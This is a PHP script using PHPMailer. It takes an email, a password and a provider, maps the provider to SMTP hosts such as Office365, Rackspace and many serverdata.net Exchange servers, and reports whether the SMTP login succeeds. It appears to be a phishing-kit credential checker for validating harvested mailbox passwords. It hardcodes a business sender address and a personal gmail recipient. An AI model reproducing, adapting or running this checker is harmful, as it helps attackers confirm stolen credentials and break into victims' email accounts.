<?php

require 'PHPMailerAutoload.php';

function check($email,$password,$provider){
	
	switch ($provider) {
    case "office":
        $port = 587;
		$smtp = 'smtp.office365.com';
        break;
    case "rackspace":
        $port = 587;
		$smtp = 'secure.emailsrvr.com';
        break;
	case "west.exch021.serverdata.net":
        $port = 587;
		$smtp = 'west.exch021.serverdata.net';
        break;
	case "west.exch022.serverdata.net":
        $port = 587;
		$smtp = 'west.exch022.serverdata.net';
        break;
	case "west.exch023.serverdata.net":
        $port = 587;
		$smtp = 'west.exch023.serverdata.net';
        break;
	case "west.exch025.serverdata.net":
        $port = 587;
		$smtp = 'west.exch025.serverdata.net';
        break;
	case "west.exch026.serverdata.net":
        $port = 587;
		$smtp = 'west.exch026.serverdata.net';
        break;
	case "west.exch027.serverdata.net":
        $port = 587;
		$smtp = 'west.exch027.serverdata.net';
        break;
	case "west.exch028.serverdata.net":
        $port = 587;
		$smtp = 'west.exch028.serverdata.net';
        break;
	case "west.exch029.serverdata.net":
        $port = 587;
		$smtp = 'west.exch029.serverdata.net';
        break;
	case "west.exch030.serverdata.net":
        $port = 587;
		$smtp = 'west.exch030.serverdata.net';
        break;
	case "west.exch031.serverdata.net":
        $port = 587;
		$smtp = 'west.exch031.serverdata.net';
        break;
	case "west.exch032.serverdata.net":
        $port = 587;
		$smtp = 'west.exch032.serverdata.net';
        break;
	case "west.exch080.serverdata.net":
        $port = 587;
		$smtp = 'west.exch080.serverdata.net';
        break;
	case "west.exch081.serverdata.net":
        $port = 587;
		$smtp = 'west.exch081.serverdata.net';
        break;
	case "west.exch082.serverdata.net":
        $port = 587;
		$smtp = 'west.exch082.serverdata.net';
        break;
	case "west.exch083.serverdata.net":
        $port = 587;
		$smtp = 'west.exch083.serverdata.net';
        break;
	case "west.exch084.serverdata.net":
        $port = 587;
		$smtp = 'west.exch084.serverdata.net';
        break;
	case "west.exch090.serverdata.net":
        $port = 587;
		$smtp = 'west.exch090.serverdata.net';
        break;
	case "west.exch091.serverdata.net":
        $port = 587;
		$smtp = 'west.exch091.serverdata.net';
        break;
	case "west.exch092.serverdata.net":
        $port = 587;
		$smtp = 'west.exch092.serverdata.net';
        break;
	case "west.exch480.serverdata.net":
        $port = 587;
		$smtp = 'west.exch480.serverdata.net';
        break;
	case "exch580.serverdata.net":
        $port = 587;
		$smtp = 'exch580.serverdata.net';
        break;
	/*case "Netsomail":
        $port = 587;
		$smtp = 'email-out-priv.myregisteredsite.com';
        break;*/
	/*case "Mail35":
        $port = 587;
		$smtp = 'smtp.$domain';
        break;*/
    /*case "ovh":
        $port = 587;
		$smtp = 'ssl0.ovh.net';
        break;*/
	}
	
	$mail = new PHPMailer;
	$mail->isSMTP();                                      // Set mailer to use SMTP
	$mail->Host = $smtp;  // Specify main and backup SMTP servers
	$mail->Port = $port;                                    // TCP port to connect to
	$mail->SMTPAuth = true;                               // Enable SMTP authentication
	$mail->Username = $email;                 // SMTP username
	$mail->Password = $password;                           // SMTP password
	$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
	$mail->setFrom('hbergamini@truehomesusa.com', 'Mailer');
	$mail->addAddress('bestfrndx@gmail.com');               // Name is optional
	$mail->addReplyTo('info@example.com', 'Information');

	$mail->isHTML(true);                                  // Set email format to HTML

	$mail->Subject = 'Here is the subject';
	$mail->Body    = 'This is the HTML message body <b>in bold!</b>';
	$mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
	if($mail->smtpConnect()){
    		$mail->smtpClose();
		return 1;
	}else{
    		return 0;
	}
}
